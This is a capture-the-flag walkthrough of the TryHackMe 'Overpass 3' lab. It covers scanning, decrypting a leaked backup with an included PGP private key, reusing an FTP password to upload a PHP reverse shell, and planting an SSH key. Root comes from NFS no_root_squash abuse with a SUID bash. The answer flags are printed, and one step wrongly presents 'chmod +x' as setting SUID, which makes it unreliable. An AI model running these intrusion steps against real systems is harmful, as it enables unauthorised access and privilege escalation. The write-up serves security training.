# [TryHackMe](https://tryhackme.com/) Room: [Overpass 3 - Hosting](https://tryhackme.com/room/overpass3hosting)

### Task 1  Overpass3 - Adventures in Hosting

## Overview

After Overpass's rocky start in infosec, and the commercial failure of their password manager and subsequent hack, they've decided to try a new business venture.

Overpass has become a web hosting company!  
Unfortunately, they haven't learned from their past mistakes. Rumor has it, their main web server is extremely vulnerable.

lets ***Start Hacking!***

## Information Gathering

 **Machine IP :** `10.10.96.246`

## Scanning

#### Nmap Scanning Report

```
$ sudo nmap -sCV -A -p 21,22,80 10.10.96.246

Nmap scan report for 10.10.96.246
Host is up (0.19s latency).

PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.3
22/tcp open  ssh     OpenSSH 8.0 (protocol 2.0)
| ssh-hostkey:
|   3072 de:5b:0e:b5:40:aa:43:4d:2a:83:31:14:20:77:9c:a1 (RSA)
|   256 f4:b5:a6:60:f4:d1:bf:e2:85:2e:2e:7e:5f:4c:ce:38 (ECDSA)
|_  256 29:e6:61:09:ed:8a:88:2b:55:74:f2:b7:33:ae:df:c8 (ED25519)
80/tcp open  http    Apache httpd 2.4.37 ((centos))
| http-methods:
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.37 (centos)
|_http-title: Overpass Hosting
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 5.4 (94%), Linux 3.10 - 3.13 (92%), Crestron XPanel control system (90%), ASUS RT-N56U WAP (Linux 3.4) (87%), Linux 3.1 (87%), Linux 3.16 (87%), Linux 3.2 (87%), HP P2000 G3 NAS device (87%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (87%), Linux 2.6.32 (86%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Unix

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   200.00 ms 10.8.0.1
2   200.00 ms 10.10.96.246
```

1. **Total Open Ports:** `3`

2. **Port Number:** `21`,`22`,`80`

3. **Services:** `ftp`,`ssh`,`http`

4. **Services Versions:**  `vsftpd 3.0.3`, `OpenSSH 8.0 (protocol 2.0)`, `Apache httpd 2.4.37 ((centos))`

5. **Operating System:** `Linux(Centos)`


## Enumeration

There a three services running on the target system.So now we start enumerating the services.lets start enumerating the http service of the target

#### HTTP Enumeration

As target have `http` server running on the machine so our first start is to look into the target website so lets do it. Let's visit the website
![[OverpassHostingMainPage.png]]
So this is main page we can see when we visit its  website.They are nothing else just a regular static page contain some information about overpass nothing more.

As we could not find anything special on the site so let's start our Directory scanning for finding some hidden directories target have

#### ffuf Directory Scanning
```
$ ffuf -w directory-list-2.3-small.txt:FUZZ -u http://10.10.96.246/FUZZ -ic

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.96.246/FUZZ
 :: Wordlist         : FUZZ: directory-list-2.3-small.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

                        [Status: 200, Size: 1770, Words: 443, Lines: 37]
backups                 [Status: 301, Size: 236, Words: 14, Lines: 8]
                        [Status: 200, Size: 1770, Words: 443, Lines: 37]
:: Progress: [87651/87651] :: Job [1/1] :: 209 req/sec :: Duration: [0:08:30] :: Errors: 9 ::
```

So we found one hidden directory name `backups` so we can visit it
![[OverpassHostingBackups.png]]

We can only see one file there name `backup.zip` so let's download it and see what's in there

![[OverpassHostingBackupsZip.png]]

As we can see from above there are two files in the backup.zip file.
* `priv.key`
* ` CustomerDetails.xlsx.gpg`

When we use the `file` command on both the file we see the following output
![[OverpassHostingBackupsZipFile.png]]

They show us that the first file(`priv.key`) is a PGP private key block. When i google it to know a little more about it so i came to know that is a private key use to decrypting the files that are encrypted  using the  [GNU Privacy Guard (GnuPG)](https://en.wikipedia.org/wiki/GNU_Privacy_Guard) 

And the other one  is a encrypted file and as the name show that is about the overpass customers. As that is encrypted file with the PGP cryptographic software so we cannot see the content of the file with out decrypting the file with private key but luckily we have the `Private Key`. 

```Private Key
-----BEGIN PGP PRIVATE KEY BLOCK-----

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
=mr8q
-----END PGP PRIVATE KEY BLOCK-----

```

So we have the private key so now let's decrypt the file and see the content of it. To decript that file we have to use a package name `gnupg` and we can install it using the following command.
Command:  `sudo apt install gnupg`

When we install it then we have use the command `gpg` . When we do that they will create a directory to our system. After that we have to import the Private Key to our `gpd` directory and we can do this with the following command.

Command: ` gpg --import priv.key`

This will add that private key and now we are able to decrypt the file with the following command

Command: `gpg --decrypt CustomerDetails.xlsx.gpg > CustomerDetails.xlsx`

This command decrypt the file and save the content of it on the file `CustomerDetails.xlsx` on our present working directory. If everything go fine then we can see the following files on our directory 
![[OverpassHostingBackupsZipFileDecrypted.png .png]]

Now when i use file command on `CustomerDetails.xlsx` file they will show us the following file type
![[OverpassHostingBackupsZipFileDecryptedType.png]]

Now this will become an excel file so we can open it on excel to see its content.
![[OverpassHostingBackupsZipFileDecryptedTypeDetails.png .png]]
This is a content that are in the file there we can see the Customer Name its Username and password and Credit Card Number and also CVC numbers.But wait we can see some of the name from the website also like `Paradox` and `MuirlandOracle` i wonder that username and password is also used in the system ssh. No its not but there is also ftp service running on the server so we can try that username and password on that.

That works we can successfully login to the ftp server using `paradox` username and `ShibesAreGreat123` as its password. when i use `ls` command there we can see this is website home directory there we can see `Backups` directory `index.html`,`main.css` etc. 
![[OverpassHostingBackupsZipFileDecryptedTypeDetailsFTP.png .png]]
So now we can put a [PHP reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) there using ftp so we can get the connection back to us. Download the reverse shell and edit the IP address with your IP address and also change the port number with your own choice. 

So now we are ready to upload the `shell.php` file to the target system. connect to the target ftp server using the following command syntax

Syntax: `ftp Target_IP_Here`
password: `ShibesAreGreat123`

so when we are connected to the ftp server using the following command to upload the shell to the target web directory
```
ftp> put shell.php
```

This will upload the `shell.php` to the target system. 
**Note if your shell.php file in other directory so give him the full PATH of that file**

## Exploitation

Now we upload the `shell.php` file to the target system now time to get the connection first start the listener on the system using the following command
```
$ nc -lvnp 4444
```
where `4444` is the port number that are in the shell.php. When you done it so just go the link in your browser or you can use the following command to activate the shell.php
```
$ curl http://Tareget_IP/shell.php
```

And now you got the connection back to the listener. if you use `id` command there your are login to the user `apache` use `cd` command and press enter  to go to home directory of that user and there you will see the `web flag`. Now time to upgrage the shell 

#### Shell Upgrade

First use the following command 

```
$ python3 -c 'import pty; pty.spawn("/bin/bash")'
```

After that press `Ctrl+z` to background the netcat shell and go to your system shell and then use the following command

```
$ stty raw -echo
```

Now use `fg` command to go back to netcat reverse shell and hit `Enter Key` twice or use `reset` command. Now you have better TTY shell but if you have to upgrade that shell more so then again press `Ctrl+z` to background the nc terminal and then type the following command 

```
$ echo $TERM
```
This command will show you the some value like this `xterm-256color` remember that value and then  use the following command
```
$ stty size
```
This command will show you some numbers like `20 120` so in this the first number show the rows and second show the column so note both the value and use `fg` command to go back to your nc shell and type the following command 
```
$ export TERM=xterm-256color

$ stty rows 30 columns 120
```
Once you done that you should get the netcat shell like a `ssh` shell.

## Privilege Escalation

So we have the ftp credentials for `paradox` user so we can do local priv-escalation so use the following command to login into `paradox` user
```
$ su paradox
password: ShibesAreGreat123
```
So when we use `ls -al` command in the `paradox` user home directory there so we see the following result
![[OverpassHostingAccess.png]] 
There is a directory name `.ssh` when we go there we see the following files there
![[OverpassHostingAccesSsh.png .png]]
There is only two file there one is `authorized_keys` and the other is `id_rsa.pub` so there is no ssh private key there so we can only connect to the ssh if we add our ssh public key in the `authorized_keys` file. To do that first we have to create a ssh key pair in our system using the following command 
```
$ ssh-keygen -f rsa  
```
This will create a ssh key pair in `.ssh` directory in `paradox` user home directory. so use `cd ~/.ssh/` command to go to that directory and there you will see two files one name is `id.rsa` and other is `id.rsa.pub` so use `cat id.rsa.pub` command to see the content of that file and copy it. Now go to the netcat reverse shell and use the following command to edit the `authorized_keys` file 
```
$ nano authorized_keys
```
and paste your public key there and now you can ssh to the target with the following command 
```
$ ssh paradox@Target_IP
```
Now you got the ssh connection also. Now we can try to search common privilege escalation vector to do that we can use `linpeas.sh` for this download [inpeas.sh](https://github.com/carlospolop/PEASS-ng/blob/master/linPEAS/linpeas.sh) in your system and we can use scp to copy that file in the system using the following command
```
$ scp ./linpeas.sh paradox@Target_IP:/tmp
```
This command will copy `linpeas.sh` file in the target `/tmp` directory using `paradox` ssh account so when we go there we can see the file.

So now we can run `linpeas.sh`  to get the privilege escalation vectors but first we have to make `linpeas.sh` in executable form using the following command
```
$ chmod +x linpeas.sh
```
And now we can run it using the following command 
```
$ ./linpeas.sh
```

As we can see from the `linpeas`  result there is not root privilege escalation vector found we there is a NFS service running as we can see from the `linpeas` result 
![[OverpassHostingAccessNfs.png .png]]

But we could not see any NFS service on nmap scan. The NFS service is running on the user `james` and `linpeas` also give us a link about miss configuration so we can visit it to learn about it also. 

After doing researching from the link give us by `linpeas`  they tell us that if we mount that nfs share on the system so we can copy our `/bin/bash` binary there and if we change there permissions to `SUID` so they will not change in remote target so we can run that `SUID` bit `bash` binary to do privilege escalation.

So now lets do that theory into action so first we have to mount that share into system but we cannot do that in paradox user account because we need `sudo` permission to do that so we can forward that port into our system using `ssh` as we have the ssh access to the `paradox` user. we can use the following command to port forwarding using ssh
```
syntax: ssh -L Localport:Local_IP:Remote_Port user@Target_IP
```

```
$ ssh -L 2049:127.0.0.1:2049 paradox@Target_IP
```

This command will forward the `2049` port that is `NFS` Port to our system 2049 Port.
I use command `rpcinfo -p` on the Target system to know about which port target nfs server is running.

So now we can mount that share on our system using the following command
```
$ sudo mount -t nfs localhost:/ /mnt/nfs
```

if every thing goes right we can successfully mount that share on our system. There we can get the `user.txt` flag and also when we use `ls -al` command there we can see there is a directory name `.ssh` there we can see the `james` user ssh private key that has `read&write` permission so we can read the ssh key using `cat` command and copy that key on our local system and change his permission using the command `chmod 600 id.rsa` so that only we can read it and now we can ssh to the `james` user using its private key with the command `ssh -i id.rsa james@Target_IP` . There we go we have ssh access to the James user also so now the time for get the root to do that follow the following steps
1. using James user copy the `/bin/bash` binary to the home directory using the following command
`$ cp /bin/bash /home/james`
2. Now go to the mounting directory in your system where you mount the James `NFS` home directory.
```
$ cd /mnt/nfs
```
3. when you use the `ls -al` command there you see the `bash` binary but they have the normal permission there. 
![[OverpassHostingNFSbash.png]]
4. Now the time to abuse the vulnerability that we discussed above we can change the permission to that file from our system 
    `$ chmod +x /mnt/nfs/bash`
    And we can see from the James ssh account that binary there got the `SUID` bit so now we can get the root with the following command
	```
	$ ./bash -p
	```
	![[OverpassHostingAccessNfsabusessh.png .png]]
	![[OverpassHostingAccessNfsabusesshroot.png]]
	
	So that how the `nfs` vulnerability work. `linpese` show us the link and we go there learn about it and now we got the root   
	

# Flags

**Web Flag**
A: thm{0ae72f7870c3687129f7a824194be09d}

**User Flag**
A: thm{3693fc86661faa21f16ac9508a43e1ae}

**Root flag**
A: thm{a4f6adb70371a4bceb32988417456c44}